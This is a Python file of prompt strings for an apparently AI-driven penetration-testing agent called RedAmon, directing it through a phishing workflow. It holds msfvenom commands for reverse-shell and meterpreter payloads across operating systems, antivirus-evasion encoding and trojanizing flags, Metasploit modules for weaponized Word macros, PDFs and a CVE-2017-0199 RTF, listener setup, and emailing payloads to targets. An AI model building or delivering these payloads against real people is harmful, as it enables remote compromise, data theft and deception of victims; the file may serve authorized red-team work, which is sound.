"""
RedAmon Phishing / Social Engineering Prompts

Prompts for social engineering attack workflows including payload generation,
malicious document creation, web delivery, handler setup, and email delivery.
"""


# =============================================================================
# PHISHING / SOCIAL ENGINEERING MAIN WORKFLOW
# =============================================================================

PHISHING_SOCIAL_ENGINEERING_TOOLS = """
## ATTACK SKILL: PHISHING / SOCIAL ENGINEERING

**CRITICAL: This attack skill has been CLASSIFIED as phishing / social engineering.**
**You MUST use the social engineering workflow below.**

Focus on generating payloads or malicious documents and delivering them to the
target. Do NOT switch to other attack chain unless the user explicitly requests it.

---

## MANDATORY SOCIAL ENGINEERING WORKFLOW

Complete these steps in order. Choose the DELIVERY METHOD that best matches the objective,
then follow the corresponding sub-workflow.

**Before generating payloads or setting up handlers: request `transition_phase` to exploitation.**
This unlocks `metasploit_console` and `kali_shell` (msfvenom) and ensures findings are tracked correctly.

### Step 1: Determine Target Platform and Delivery Method

**Ask the user (if not clear from the objective) via action="ask_user":**
1. **Target platform**: Windows, Linux, macOS, Android, or multi-platform?
2. **Delivery method**: Which approach?
   - **A) Standalone Payload** — executable/script the target runs directly (exe, elf, apk, py, ps1, bash)
   - **B) Malicious Document** — weaponized Office (macro) / PDF file

Only A and B are offered. **Web Delivery and HTA Delivery are NOT options here** (and are not listed above): each needs a SECOND inbound port (`SRVPORT`) for the target to download from, and your Kali sandbox exposes exactly ONE inbound port reachable from targets — your reverse handler port: the pool port, or `4444` reached through your tunnel (the exact value is in the "Pre-Configured Payload Settings" block above). The same rules out B4 (`office_word_hta`) and any module that opens an extra `SRVHOST`/`SRVPORT`. Prefer a standalone stageless payload (Method A), delivered through the chat download card or email; after you land a session you can upload further payloads over it.

**If the objective already specifies the platform and method, skip asking and proceed.**

### Step 2: Set Up the Handler (ALWAYS — do this FIRST or IN PARALLEL)

**The handler catches the callback when the target executes the payload.**

**CRITICAL: ALWAYS use Metasploit `exploit/multi/handler` via the `metasploit_console` tool.**
**NEVER use `nc`, `ncat`, `netcat`, or `socat` as a listener — even for plain shell payloads like `cmd/unix/reverse_bash`.**
**Only Metasploit handlers create tracked sessions that appear in the RedAmon Remote Shells UI.**
**A plain netcat listener will catch the shell but RedAmon cannot detect, display, or interact with it.**
**If `metasploit_console` is not available in your current phase, request a phase transition to exploitation BEFORE setting up the handler.**

Read "Pre-Configured Payload Settings" section (if present above) FIRST.
It tells you whether to use REVERSE or BIND mode. Follow ONLY that mode's setup.

**REVERSE mode handler (most common for phishing):**
```
use exploit/multi/handler; set PAYLOAD <payload_from_step_3>; set LHOST <LHOST>; set LPORT <LPORT>; run -j
```
Follow the exact handler commands from "Pre-Configured Payload Settings" above (includes ngrok settings if active).

**BIND mode handler (rare for phishing, target must be reachable):**
```
use exploit/multi/handler; set PAYLOAD <bind_payload>; set RHOST <target-ip>; set LPORT <BIND_PORT>; run -j
```

**IMPORTANT:** The handler MUST use the EXACT SAME payload as the generated artifact (Step 3).
Mismatched payloads = the callback silently fails.

Run the handler with `-j` (background job) so it waits while you prepare and deliver the payload.

### Step 3: Generate the Payload/Document (choose ONE method)

---

#### Method A: Standalone Payload (msfvenom via `kali_shell`)

Generate a payload binary/script using msfvenom:

```
kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /workspace/<projectId>/notes/<output_filename>"
```

`/workspace/<projectId>/` is your project workspace root (the exact path is under "Workspace Layout").
Write every file the user will download under its `notes/`: the chat shows a download card only for a
file of this project's workspace, never for one under `/tmp`.

**Payload + Format Selection Matrix** (STAGELESS — works through any tunnel):

**CRITICAL: CHECK "Pre-Configured Payload Settings" ABOVE. If ngrok or chisel is active, use the stageless payloads below. Staged variants FAIL through tunnels — sessions die in a loop.**

| Target OS | Payload (stageless) | Format (`-f`) | Output File (under the workspace root) | Notes |
|-----------|---------------------|---------------|-------------|-------|
| Windows | `windows/meterpreter_reverse_tcp` | `exe` | `notes/payload.exe` | Most common |
| Windows | `windows/meterpreter_reverse_https` | `exe` | `notes/payload.exe` | Encrypted, firewall bypass |
| Windows | `windows/shell_reverse_tcp` | `exe` | `notes/shell.exe` | Shell fallback |
| Windows | `windows/meterpreter_reverse_tcp` | `psh` / `psh-reflection` | `notes/payload.ps1` | PowerShell (fileless / AV evasion) |
| Windows | `windows/meterpreter_reverse_tcp` | `vba` | `notes/payload.vba` | VBA macro (Office) |
| Windows | `windows/meterpreter_reverse_tcp` | `hta-psh` | `notes/payload.hta` | HTA wrapping PS |
| Linux | `linux/x64/meterpreter_reverse_tcp` | `elf` | `notes/payload.elf` | Standard Linux |
| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `notes/shell.elf` | Shell fallback |
| Linux | `cmd/unix/reverse_bash` | `raw` | `notes/payload.sh` | Bash one-liner |
| Linux | `cmd/unix/reverse_python` | `raw` | `notes/payload.py` | Python one-liner |
| macOS | `osx/x64/meterpreter_reverse_tcp` | `macho` | `notes/payload.macho` | Mach-O |
| Android | `android/meterpreter_reverse_tcp` | `raw` | `notes/payload.apk` | APK |
| Java/Web | `java/meterpreter_reverse_tcp` | `war` | `notes/payload.war` | Tomcat/JBoss |
| Multi | `python/meterpreter_reverse_tcp` | `raw` | `notes/payload.py` | Cross-platform |

**Staged variant (direct connections only — NOT through tunnels):** replace the underscore with a slash to switch, e.g. `windows/meterpreter_reverse_tcp` → `windows/meterpreter/reverse_tcp`. The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure.

**Encoding for AV evasion (optional):**
```
msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o /workspace/<projectId>/notes/payload_encoded.exe
```

**After generation:** Verify the file was created:
```
kali_shell: "ls -la /workspace/<projectId>/notes/payload.exe && hexdump -C /workspace/<projectId>/notes/payload.exe | head -2"
```

---

#### Method B: Malicious Document (Metasploit fileformat modules via `metasploit_console`)

Use Metasploit fileformat modules to generate weaponized documents.

**Tunnel note:** If ngrok or chisel is active, replace staged (`/`) with stageless (`_`) payloads.
Staged payloads only work with direct connections (no tunnel).

**B1: Word Document with VBA Macro**
```
use exploit/multi/fileformat/office_word_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.docm; run
```

**B3: PDF Exploit (Adobe Reader)**
```
use exploit/windows/fileformat/adobe_pdf_embedded_exe; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.pdf; run
```

**B4: RTF with HTA Handler (CVE-2017-0199)**
**⚠ Needs a second inbound port — unavailable in your Kali sandbox.** `office_word_hta` opens an `SRVPORT` HTTP server that the target's RTF must reach to fetch the HTA; the sandbox exposes only the one reverse handler port, so the target can never reach `SRVPORT`. Use a self-contained document instead (B1 or B3 embed the payload directly), or Method A, and upload anything further over the session once you have one.
```
use exploit/windows/fileformat/office_word_hta; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; set FILENAME malicious.rtf; run
```
This module self-hosts the HTA payload — the RTF fetches it automatically when opened.

**CRITICAL: Fileformat module output location:**
All fileformat modules save output to `~/.msf4/local/<FILENAME>` of the user running msfconsole
(`/root/.msf4/local/` only when it runs as root). Copy it, by the FILENAME you set, into the workspace:
```
kali_shell: "cp ~/.msf4/local/<FILENAME> /workspace/<projectId>/notes/<FILENAME> && ls -la /workspace/<projectId>/notes/<FILENAME>"
```

---

#### Web Delivery and HTA Delivery — NOT AVAILABLE in your Kali sandbox

Metasploit's `web_delivery`, `hta_server` and `office_word_hta` each open a second
inbound HTTP port (`SRVPORT`) that the target must reach to download the payload. Your
sandbox exposes exactly ONE inbound port the target can reach — your reverse handler port
(the pool port, or `4444` through your tunnel) — and neither the pool nor a tunnel
forwards a second port. So the target can never reach `SRVPORT`, and these modules cannot
produce a session here. Do NOT run them. Use **Method A** (a standalone stageless payload,
delivered via the chat download card or email) or **Method B** (a self-contained
document); after you land a session, `upload` any next stage over it.

---

### Step 4: Verify Payload/Document Was Generated

**For msfvenom payloads (Method A):**
```
kali_shell: "ls -la /workspace/<projectId>/notes/<filename> && hexdump -C /workspace/<projectId>/notes/<filename> | head -2"
```

**For fileformat modules (Method B):**
```
kali_shell: "ls -la ~/.msf4/local/ && cp ~/.msf4/local/<filename> /workspace/<projectId>/notes/<filename>"
```

### Step 5: Deliver to Target

#### Chat Download (default)
Report the file location and details to the user.
The file appears as a download card in the chat (only for a file of this project's workspace):
- File path: `/workspace/<projectId>/notes/<filename>`
- File size and type (from `ls -la` and the `hexdump` magic bytes)
- Payload type and callback parameters (LHOST:LPORT)
- Handler status (running in background)

#### Email Delivery (if user requests)
Use `execute_code` with Python `smtplib` to send the payload/document as an email attachment or link.
- If "Pre-Configured SMTP Settings" section exists above, use those settings directly.
- If NO SMTP settings are configured, **MUST** ask user via `action="ask_user"` for: SMTP host, port, username, password, sender address, and target email. Do NOT attempt to send without credentials.

---

## TROUBLESHOOTING

| Problem | Fix |
|---------|-----|
| msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
| Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
| Handler dies immediately | Check LHOST is correct, then follow the "Pre-Configured Payload Settings" block verbatim. WITH A TUNNEL (ngrok or chisel) do NOT bind on LPORT: the handler binds `ReverseListenerBindAddress 127.0.0.1` / `ReverseListenerBindPort 4444` (the local port the tunnel delivers to) while LPORT stays the PUBLIC tunnel port. WITH THE POOL (no tunnel) the handler and LPORT are both the assigned pool port — bind that. Never invent a port. |
| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. If using ngrok or chisel, verify you are using a STAGELESS payload (underscore `_` not slash `/`). If using chisel, also check `/var/log/chisel.log` in your Kali sandbox. |
| Session opens then dies instantly | You are using a STAGED payload through a tunnel (ngrok or chisel) — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). Staged payloads typically fail through TCP-forwarding tunnels (ngrok/chisel) but work over direct connections and full L3 tunnels (VPN). |
| "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
| Web delivery: no session | Web delivery CANNOT work in your Kali sandbox at all: it needs a second inbound port (SRVPORT), and the sandbox exposes only the one reverse handler port whether you use the pool or a tunnel. The target can never reach SRVPORT. Switch to Method A (standalone stageless payload), or ask the user. |
| HTA / office_word_hta: no session | Same as web delivery: these need SRVPORT reachable, which the sandbox's single inbound port cannot provide. Use a self-contained document or Method A, or ask the user. |
| No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
| **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
"""


# =============================================================================
# PAYLOAD FORMAT GUIDANCE (OS-specific selection)
# =============================================================================

PHISHING_PAYLOAD_FORMAT_GUIDANCE = """
## Payload Format Selection Guide

### Decision Tree: Which format to generate?

```
Target OS?
├── Windows
│   ├── User will run an executable? → -f exe (payload.exe)
│   ├── Need fileless/AV evasion? → -f psh-reflection (payload.ps1)
│   ├── Embedding in Office document? → -f vba (payload.vba) or use Method B
│   ├── HTA delivery? → -f hta-psh (standalone payload.hta, delivered via the chat card — NOT a hosted hta_server, which needs a second inbound port the sandbox lacks)
│   └── Java web app (Tomcat)? → -f war (payload.war)
│
├── Linux
│   ├── User will run a binary? → -f elf (payload.elf)
│   ├── User has Python? → -f raw with python payload (payload.py)
│   └── User has bash? → -f raw with bash payload (payload.sh)
│
├── macOS
│   └── User will run a binary? → -f macho (payload.macho)
│
├── Android
│   └── APK install? → -f raw with android payload (payload.apk)
│
└── Unknown / Multi-platform
    ├── Python available? → -f raw with python/meterpreter (payload.py)
    └── Web server? → -f war (payload.war) — NOT web_delivery (needs a second inbound port the sandbox lacks)
```

### msfvenom Quick Reference

**List payloads:** `msfvenom --list payloads | grep <os>`
**List formats:** `msfvenom --list formats`
**List encoders:** `msfvenom --list encoders`

**Common flags:**
- `-p <payload>` — payload to use
- `LHOST=<ip>` — callback IP
- `LPORT=<port>` — callback port
- `-f <format>` — output format
- `-o <file>` — output file path
- `-e <encoder>` — encoder for AV evasion (e.g., `x86/shikata_ga_nai`)
- `-i <count>` — encoding iterations
- `-a <arch>` — architecture (x86, x64)
- `--platform <os>` — target platform
- `-x <template>` — embed in existing executable (trojanize)
- `-k` — keep template functionality (with -x)
"""
